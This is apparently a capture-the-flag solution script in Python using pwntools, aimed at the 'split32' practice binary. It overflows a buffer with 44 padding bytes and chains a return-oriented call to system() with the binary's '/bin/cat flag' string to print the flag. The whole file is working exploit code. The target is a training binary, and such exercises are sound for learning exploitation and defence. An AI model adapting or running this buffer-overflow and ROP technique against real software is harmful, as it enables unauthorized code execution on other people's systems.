from pwn import *

elf = context.binary = ELF('./split32')



#bytes to reach the EIP
padding = b"A" *44

#locate the functions and the strings we need
bincat_addr = next(elf.search(b'/bin/cat flag'))
system_addr = elf.symbols.system

#print out the target address
log.info("%#x /bin/cat", bincat_addr)
log.info("%#x system", system_addr)
rop = ROP(elf)
rop.system(bincat_addr)
info(rop.dump())


io = process(elf.path)
io.recvuntil('> ')
exploit = padding + rop.chain()
io.sendline(exploit)
flag = io.recvall()
success(flag)

